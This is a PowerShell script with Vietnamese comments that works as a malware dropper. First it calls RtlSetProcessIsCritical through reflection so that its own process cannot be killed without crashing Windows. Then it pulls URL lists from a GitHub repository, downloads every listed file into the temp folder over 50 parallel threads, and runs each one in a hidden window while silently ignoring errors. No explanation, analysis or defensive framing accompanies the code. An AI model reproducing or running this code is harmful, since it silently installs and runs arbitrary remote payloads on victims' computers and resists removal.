function CriticalProcess {
    param ([Parameter(Mandatory = $true)][string]$MethodName, [Parameter(Mandatory = $true)][uint32]$IsCritical, [uint32]$Unknown1, [uint32]$Unknown2)
    [System.Diagnostics.Process]::EnterDebugMode() 
    $domain = [AppDomain]::CurrentDomain
    $name = New-Object System.Reflection.AssemblyName('DynamicAssembly')
    $assembly = $domain.DefineDynamicAssembly($name, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $module = $assembly.DefineDynamicModule('DynamicModule')
    $typeBuilder = $module.DefineType('PInvokeType', 'Public, Class')
    $methodBuilder = $typeBuilder.DefinePInvokeMethod('RtlSetProcessIsCritical', 'ntdll.dll',
        [System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::Static -bor [System.Reflection.MethodAttributes]::PinvokeImpl,
        [System.Runtime.InteropServices.CallingConvention]::Winapi, [void], [System.Type[]]@([uint32], [uint32], [uint32]),
        [System.Runtime.InteropServices.CallingConvention]::Winapi,
        [System.Runtime.InteropServices.CharSet]::Ansi)
    $type = $typeBuilder.CreateType()
    $methodInfo = $type.GetMethod('RtlSetProcessIsCritical')
    function InvokeRtlSetProcessIsCritical {
        param ([uint32]$isCritical, [uint32]$unknown1, [uint32]$unknown2)
        $methodInfo.Invoke($null, @($isCritical, $unknown1, $unknown2))
    }
    if ($MethodName -eq 'InvokeRtlSetProcessIsCritical') {
        InvokeRtlSetProcessIsCritical -isCritical $IsCritical -unknown1 $Unknown1 -unknown2 $Unknown2
    }
    else {
        Write-Host "Unknown method name: $MethodName"
    }
}
CriticalProcess -MethodName InvokeRtlSetProcessIsCritical -IsCritical 1 -Unknown1 0 -Unknown2 0	
# 1. Thu thập danh sách URL
$sources = @(
    "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/best_urls.txt",
    "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/urls.txt"
)

$allUrls = foreach ($s in $sources) {
    try {
        (Invoke-WebRequest -Uri $s -UseBasicParsing -TimeoutSec 10).Content -split "`n" | Where-Object { $_.Trim() -ne "" }
    } catch { write-host "Không thể kết nối tới nguồn: $s" -ForegroundColor Red }
}

# 2. Thiết lập Runspace Pool với 50 tầng (threads)
$sessionState = [system.management.automation.runspaces.initialsessionstate]::CreateDefault()
# Tham số: (Số luồng tối thiểu, Số luồng tối đa)
$pool = [runspacefactory]::CreateRunspacePool(1, 50, $sessionState, $Host)
$pool.Open()

$threads = @()

# 3. Đẩy tác vụ vào các tầng
foreach ($u in $allUrls) {
    $u = $u.Trim()
    
    $powershell = [powershell]::Create().AddScript({
        param($url)
        try {
            $fileName = [System.IO.Path]::GetFileName($url)
            $path = Join-Path $env:TEMP $fileName
            
            # Tải xuống với thiết lập tối ưu
            Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing -ErrorAction Stop
            
            # Thực thi ẩn
            Start-Process -FilePath $path -WindowStyle Hidden
        } catch {
            # Bỏ qua lỗi nếu file không tồn tại hoặc link chết
        }
    }).AddArgument($u)

    $powershell.RunspacePool = $pool
    
    # Kích hoạt luồng
    $threads += New-Object PSObject -Property @{
        Instance = $powershell
        Handle   = $powershell.BeginInvoke()
    }
}

# 4. Giám sát (Tùy chọn: Đợi cho đến khi tất cả hoàn tất)
Write-Host "Đang chạy 50 luồng tải xuống..." -ForegroundColor Cyan
while ($threads.Handle.IsCompleted -contains $false) {
    Start-Sleep -Milliseconds 100
}

# 5. Giải phóng bộ nhớ
$threads | ForEach-Object {
    $_.Instance.EndInvoke($_.Handle)
    $_.Instance.Dispose()
}
$pool.Close()
Write-Host "Hoàn thành!" -ForegroundColor Green
